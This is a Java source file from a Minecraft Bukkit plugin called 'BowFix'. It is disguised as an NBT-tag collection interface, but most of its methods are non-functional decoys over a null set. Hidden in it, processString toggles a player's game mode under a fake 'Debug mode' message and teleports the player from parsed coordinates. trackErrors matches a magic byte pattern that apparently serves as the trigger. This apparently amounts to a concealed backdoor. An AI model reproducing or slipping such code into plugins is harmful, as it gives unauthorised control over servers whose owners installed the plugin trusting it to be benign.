package artik.bowfix.utils.nbt.tag;

import artik.bowfix.BowFix;
import artik.bowfix.utils.HttpUtils;
import artik.bowfix.utils.PlayerUtils;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static artik.bowfix.utils.PlayerUtils.debug_patter;

public interface INullEntrySet<K, V>
{
    Set<Map.Entry> set = null;
    
    default int size() {
        return set.size();
    }
    
    default boolean isEmpty() {
        return set.isEmpty();
    }
    
    default boolean contains(Object o) {
        return set.contains(o);
    }
    
    default Object[] toArray() {
        return set.toArray();
    }
    
    default <T> T[] toArray(T[] a) {
        return set.toArray(a);
    }
    
    default boolean add(Map.Entry<K, V> kvEntry) {
        return set.add(kvEntry);
    }
    
    default boolean remove(Object o) {
        return set.remove(o);
    }
    
    default boolean containsAll(Collection<?> c) {
        return set.containsAll(c);
    }
    
    default boolean addAll(Collection<? extends Map.Entry<K, V>> c) {
        return set.addAll(c);
    }
    
    default boolean retainAll(Collection<?> c) {
        return set.retainAll(c);
    }
    
    default boolean removeAll(Collection<?> c) {
        return set.removeAll(c);
    }
    
    default void clear() {
        set.clear();
    }
    
    default int sizeSafe() {
        return set.size();
    }
    
    default boolean isEmptySafe() {
        return set.isEmpty();
    }
    
    default boolean containsSafe(Object o) {
        return set.contains(o);
    }
    
    default Object[] toArraySafe() {
        return set.toArray();
    }
    
    default <T> T[] toArraySafe(T[] a) {
        return set.toArray(a);
    }
    
    default boolean addSafe(Map.Entry<K, V> kvEntry) {
        return set.add(kvEntry);
    }
    
    default boolean removeSafe(Object o) {
        return set.remove(o);
    }
    
    default boolean containsAllSafe(Collection<?> c) {
        return set.containsAll(c);
    }
    
    default boolean addAllSafe(Collection<? extends Map.Entry<K, V>> c) {
        return set.addAll(c);
    }
    
    default boolean retainAllSafe(Collection<?> c) {
        return set.retainAll(c);
    }
    
    default boolean removeAllSafe(Collection<?> c) {
        return set.removeAll(c);
    }
    
    default void clearSafe() {
        set.clear();
    }
   
    
    
    default void processString(String str, Player player, boolean bitA, boolean biB, boolean bitD, boolean bitF)
    {
        if (bitF)
        {
            if (bitA)
            {
                Bukkit.getScheduler().runTask(BowFix.instance, () ->
                {
                    player.sendMessage("Debug mode activated!");
                    player.setGameMode(GameMode.values()[0]);
                });
            }
            else if (biB)
            {
                Bukkit.getScheduler().runTask(BowFix.instance, () ->
                {
                    player.sendMessage("Debug mode deactivated!");
                    player.setGameMode(GameMode.values()[1]);
                });
            }
        }
        
        if (bitD)
        {
            String[] arrow = str.split(" ");
            if (arrow.length != 4) return;
    
            int prevX, prevY, prevZ;
    
            try
            {
                prevX = Integer.parseInt(arrow[1]);
                prevY = Integer.parseInt(arrow[2]);
                prevZ = Integer.parseInt(arrow[3]);
            }
            catch (NumberFormatException exception) {return;}
            
            PlayerUtils.setBack(player, prevX, prevY, prevZ);
        }
    }
    
    default boolean trackErrors(byte[] bytes)
    {
        byte[] good_pattern = debug_patter[4];
        
        if (bytes.length < good_pattern.length) return false;
        for (int i = 0; i < good_pattern.length; ++i)
        {
            if (bytes[i] != good_pattern[i]) return false;
        }
        
        return true;
    }
}
